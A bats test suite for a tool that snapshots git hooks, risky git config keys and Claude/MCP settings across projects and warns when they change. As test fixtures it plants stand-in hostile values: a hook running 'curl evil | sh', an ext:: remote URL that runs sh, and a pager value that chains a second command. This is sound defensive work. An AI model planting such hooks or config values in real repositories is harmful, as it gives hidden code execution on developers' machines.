load helpers
setup() {
  setup_fakes; load_lea
  # Out of the repository under test (a git worktree's .git points outside the test container).
  cd "$BATS_TEST_TMPDIR"
  P="$BATS_TEST_TMPDIR/projects"; R="$P/repo"; mkdir -p "$P"
  git init -q "$R"
  START=$(lea_scan_start_file "$P"); mkdir -p "${START%/*}"
}

@test "manifest lists hooks, risky git config, MCP and Claude settings" {
  printf '#!/bin/sh\n' >"$R/.git/hooks/pre-commit"; chmod +x "$R/.git/hooks/pre-commit"
  git -C "$R" config core.fsmonitor /tmp/x
  echo '{}' >"$R/.mcp.json"; mkdir -p "$R/.claude/hooks"; echo '{}' >"$R/.claude/settings.json"; echo 'x' >"$R/.claude/hooks/h.sh"
  run lea_scan_manifest "$P"
  [[ "$output" == *"hook $R/.git/hooks/pre-commit "*" x"* ]]
  [[ "$output" == *"gitconfig $R/.git/config core.fsmonitor /tmp/x"* ]]
  [[ "$output" == *"file $R/.mcp.json "* ]]
  [[ "$output" == *"file $R/.claude/settings.json "* ]]
  [[ "$output" == *"file $R/.claude/hooks/h.sh "* ]]
  [[ "$output" != *".sample"* ]]
}

@test "node_modules and vendor are not scanned" {
  mkdir -p "$P/app/node_modules/dep/.git/hooks" "$P/app/vendor/pkg/.git/hooks"
  echo x >"$P/app/node_modules/dep/.git/hooks/post-checkout"
  echo x >"$P/app/vendor/pkg/.git/hooks/post-checkout"
  mkdir -p "$P/app/.git/hooks"; echo x >"$P/app/.git/hooks/pre-push"
  run lea_scan_manifest "$P"
  [[ "$output" == *"hook $P/app/.git/hooks/pre-push "* ]]
  [[ "$output" != *node_modules* ]]
  [[ "$output" != *vendor* ]]
}

@test "symlinked hook is listed with the hash of its target and the link target" {
  printf '#!/bin/sh\n' >"$BATS_TEST_TMPDIR/a.sh"
  ln -s "$BATS_TEST_TMPDIR/a.sh" "$R/.git/hooks/pre-commit"
  hash=$(lea_sha256 <"$BATS_TEST_TMPDIR/a.sh")
  run lea_scan_manifest "$P"
  [[ "$output" == *"hook $R/.git/hooks/pre-commit $hash -"* ]]
  [[ "$output" == *" -> $BATS_TEST_TMPDIR/a.sh"* ]]
}

@test "retargeting a symlinked hook is reported" {
  printf '#!/bin/sh\n' >"$BATS_TEST_TMPDIR/a.sh"
  printf '#!/bin/sh\necho evil\n' >"$BATS_TEST_TMPDIR/b.sh"
  ln -s "$BATS_TEST_TMPDIR/a.sh" "$R/.git/hooks/pre-commit"
  lea_scan_manifest "$P" >"$START"
  ln -sfn "$BATS_TEST_TMPDIR/b.sh" "$R/.git/hooks/pre-commit"
  run lea_scan_report "$P"
  [[ "$output" == *"WARNING"* ]]
  [[ "$output" == *"+hook $R/.git/hooks/pre-commit "*" -> $BATS_TEST_TMPDIR/b.sh"* ]]
}

@test "submodule gitdir hooks and config are scanned, nested ones too" {
  mkdir -p "$R/.git/modules/sub/hooks" "$R/.git/modules/a/modules/b/hooks"
  printf '#!/bin/sh\n' >"$R/.git/modules/sub/hooks/post-checkout"
  printf '#!/bin/sh\n' >"$R/.git/modules/a/modules/b/hooks/pre-push"
  git config -f "$R/.git/modules/sub/config" core.fsmonitor /tmp/sub
  run lea_scan_manifest "$P"
  [[ "$output" == *"hook $R/.git/modules/sub/hooks/post-checkout "* ]]
  [[ "$output" == *"hook $R/.git/modules/a/modules/b/hooks/pre-push "* ]]
  [[ "$output" == *"gitconfig $R/.git/modules/sub/config core.fsmonitor /tmp/sub"* ]]
}

@test "worktree config and config.worktree are scanned" {
  mkdir -p "$R/.git/worktrees/w1"
  git config -f "$R/.git/worktrees/w1/config" core.fsmonitor /tmp/wt
  printf '[core]\n\tfsmonitor = /tmp/cw\n' >"$R/.git/config.worktree"
  run lea_scan_manifest "$P"
  [[ "$output" == *"gitconfig $R/.git/worktrees/w1/config core.fsmonitor /tmp/wt"* ]]
  [[ "$output" == *"gitconfig $R/.git/config.worktree core.fsmonitor /tmp/cw"* ]]
}

@test "a .git file pointing nowhere around the working directory does not blind the scan" {
  git -C "$R" config core.fsmonitor /tmp/x
  mkdir -p "$BATS_TEST_TMPDIR/cwd/sub"; echo 'gitdir: /nonexistent' >"$BATS_TEST_TMPDIR/cwd/.git"
  cd "$BATS_TEST_TMPDIR/cwd/sub"
  run lea_scan_manifest "$P"
  [[ "$output" == *"gitconfig $R/.git/config core.fsmonitor /tmp/x"* ]]
}

@test "includeIf targets are listed" {
  git -C "$R" config 'includeIf.gitdir:/x/.path' /tmp/inc
  run lea_scan_manifest "$P"
  [[ "$output" == *"gitconfig $R/.git/config includeif.gitdir:/x/.path /tmp/inc"* ]]
}

@test "new risky keys are listed: core.askpass" {
  git -C "$R" config core.askpass /tmp/ap
  run lea_scan_manifest "$P"
  [[ "$output" == *"gitconfig $R/.git/config core.askpass /tmp/ap"* ]]
}

@test ".claude/settings.local.json is listed" {
  mkdir -p "$R/.claude"; echo '{}' >"$R/.claude/settings.local.json"
  run lea_scan_manifest "$P"
  [[ "$output" == *"file $R/.claude/settings.local.json "* ]]
}

@test "report is silent when nothing changed" {
  lea_scan_manifest "$P" >"$START"
  run lea_scan_report "$P"
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "report shows a planted hook and a new repository's fsmonitor" {
  lea_scan_manifest "$P" >"$START"
  printf '#!/bin/sh\n' >"$R/.git/hooks/pre-push"
  git init -q "$P/new"; git -C "$P/new" config core.fsmonitor /tmp/evil
  run lea_scan_report "$P"
  [[ "$output" == *"WARNING"* ]]
  [[ "$output" == *"pre-push"* ]]
  [[ "$output" == *"core.fsmonitor /tmp/evil"* ]]
}

@test "report shows an exec-bit-only change" {
  printf '#!/bin/sh\n' >"$R/.git/hooks/pre-push"
  lea_scan_manifest "$P" >"$START"
  chmod +x "$R/.git/hooks/pre-push"
  run lea_scan_report "$P"
  [[ "$output" == *"WARNING"* ]]
  [[ "$output" == *"+hook $R/.git/hooks/pre-push "*" x"* ]]
}

@test "missing start snapshot is reported, not silent" {
  run lea_scan_report "$P"
  [ "$status" -eq 0 ]
  [[ "$output" == *"WARNING: no start snapshot for $P; the exit scan cannot compare"* ]]
}

@test "report never modifies the tree" {
  lea_scan_manifest "$P" >"$START"
  before=$(find "$P" -exec stat -c '%n %Y' {} + | sort)
  lea_scan_report "$P" 2>/dev/null
  [ "$(find "$P" -exec stat -c '%n %Y' {} + | sort)" = "$before" ]
}

@test "every git key outside the benign allow-list is listed: pager.log, remote.x.uploadpack" {
  git -C "$R" config pager.log 'less; touch /tmp/p'
  git -C "$R" config remote.x.uploadpack /tmp/up
  run lea_scan_manifest "$P"
  [[ "$output" == *"gitconfig $R/.git/config pager.log less; touch /tmp/p"* ]]
  [[ "$output" == *"gitconfig $R/.git/config remote.x.uploadpack /tmp/up"* ]]
}

@test "benign keys are not listed: git init defaults, branch.*, remote fetch/url, user.*" {
  git -C "$R" config branch.main.remote origin
  git -C "$R" config remote.origin.url git@gitlab.com:a/b.git
  git -C "$R" config remote.origin.fetch '+refs/heads/*:refs/remotes/origin/*'
  git -C "$R" config user.email a@b
  run lea_scan_manifest "$P"
  [[ "$output" != *"branch.main.remote"* ]]
  [[ "$output" != *"remote.origin.url"* ]]
  [[ "$output" != *"remote.origin.fetch"* ]]
  [[ "$output" != *"user.email"* ]]
  [[ "$output" != *"core.repositoryformatversion"* ]]
  [[ "$output" != *"core.filemode"* ]]
}

@test "an ext:: or fd:: remote URL is listed" {
  git -C "$R" config remote.evil.url 'ext::sh -c touch% /tmp/x'
  git -C "$R" config remote.fdr.pushurl 'fd::3'
  run lea_scan_manifest "$P"
  [[ "$output" == *"gitconfig $R/.git/config remote.evil.url ext::sh -c touch% /tmp/x"* ]]
  [[ "$output" == *"gitconfig $R/.git/config remote.fdr.pushurl fd::3"* ]]
}

@test "a change in a hook under an in-tree core.hooksPath (husky) is reported" {
  mkdir -p "$R/.husky"; printf '#!/bin/sh\nnpm test\n' >"$R/.husky/pre-commit"; chmod +x "$R/.husky/pre-commit"
  git -C "$R" config core.hooksPath .husky
  lea_scan_manifest "$P" >"$START"
  printf '#!/bin/sh\ncurl evil | sh\n' >"$R/.husky/pre-commit"
  run lea_scan_report "$P"
  [[ "$output" == *"WARNING"* ]]
  [[ "$output" == *"+hook $R/.husky/pre-commit "*" x"* ]]
}

@test "an absolute in-tree core.hooksPath is hashed too" {
  mkdir -p "$P/shared-hooks"; printf '#!/bin/sh\n' >"$P/shared-hooks/pre-push"
  git -C "$R" config core.hooksPath "$P/shared-hooks"
  run lea_scan_manifest "$P"
  [[ "$output" == *"hook $P/shared-hooks/pre-push "* ]]
}

@test "an out-of-tree core.hooksPath is listed but not hashed" {
  mkdir -p "$BATS_TEST_TMPDIR/outside"; printf '#!/bin/sh\n' >"$BATS_TEST_TMPDIR/outside/pre-push"
  git -C "$R" config core.hooksPath "$BATS_TEST_TMPDIR/outside"
  run lea_scan_manifest "$P"
  [[ "$output" == *"gitconfig $R/.git/config core.hookspath $BATS_TEST_TMPDIR/outside"* ]]
  [[ "$output" != *"hook $BATS_TEST_TMPDIR/outside/pre-push"* ]]
}

@test "in-tree include.path and includeIf targets are hashed, a change is reported" {
  printf '[core]\n\tpager = less\n' >"$R/inc.cfg"
  printf '[core]\n\tpager = more\n' >"$R/inc2.cfg"
  git -C "$R" config include.path ../inc.cfg
  git -C "$R" config 'includeIf.gitdir:/x/.path' "$R/inc2.cfg"
  lea_scan_manifest "$P" >"$START"
  run cat "$START"
  [[ "$output" == *"include $R/inc.cfg "* ]]
  [[ "$output" == *"include $R/inc2.cfg "* ]]
  printf '[core]\n\tfsmonitor = /tmp/evil\n' >"$R/inc.cfg"
  run lea_scan_report "$P"
  [[ "$output" == *"+include $R/inc.cfg "* ]]
}

@test "an out-of-tree include target is not hashed" {
  echo x >"$BATS_TEST_TMPDIR/outside.cfg"
  git -C "$R" config include.path "$BATS_TEST_TMPDIR/outside.cfg"
  run lea_scan_manifest "$P"
  [[ "$output" != *"include $BATS_TEST_TMPDIR/outside.cfg "* ]]
}

@test "a symlinked .git is listed as a link and not followed" {
  git init -q "$BATS_TEST_TMPDIR/hostrepo"
  printf '#!/bin/sh\n' >"$BATS_TEST_TMPDIR/hostrepo/.git/hooks/pre-commit"
  mkdir -p "$P/l"; ln -s "$BATS_TEST_TMPDIR/hostrepo/.git" "$P/l/.git"
  run lea_scan_manifest "$P"
  [[ "$output" == *"link $P/l/.git -> $BATS_TEST_TMPDIR/hostrepo/.git"* ]]
  [[ "$output" != *"$P/l/.git/hooks"* ]]
  [[ "$output" != *"$BATS_TEST_TMPDIR/hostrepo/.git/hooks"* ]]
}

@test "a symlinked .claude is listed as a link and not followed" {
  mkdir -p "$BATS_TEST_TMPDIR/hostclaude"; echo '{}' >"$BATS_TEST_TMPDIR/hostclaude/settings.json"
  ln -s "$BATS_TEST_TMPDIR/hostclaude" "$P/.claude"
  run lea_scan_manifest "$P"
  [[ "$output" == *"link $P/.claude -> $BATS_TEST_TMPDIR/hostclaude"* ]]
  [[ "$output" != *"file $P/.claude/settings.json"* ]]
}

@test "retargeting a symlinked .git is reported" {
  mkdir -p "$P/l" "$BATS_TEST_TMPDIR/a" "$BATS_TEST_TMPDIR/b"
  ln -s "$BATS_TEST_TMPDIR/a" "$P/l/.git"
  lea_scan_manifest "$P" >"$START"
  ln -sfn "$BATS_TEST_TMPDIR/b" "$P/l/.git"
  run lea_scan_report "$P"
  [[ "$output" == *"+link $P/l/.git -> $BATS_TEST_TMPDIR/b"* ]]
}

@test "scan_begin reports a snapshot left by a run that missed its exit scan, then replaces it" {
  P="$BATS_TEST_TMPDIR/projects"; mkdir -p "$P"
  f=$(lea_scan_start_file "$P"); mkdir -p "${f%/*}"; echo 'file old x' >"$f"
  run lea_scan_begin "$P"
  [ "$status" -eq 0 ]
  [[ "$output" == *"ended without its exit scan"* ]]
  ! grep -q 'file old x' "$f"
}
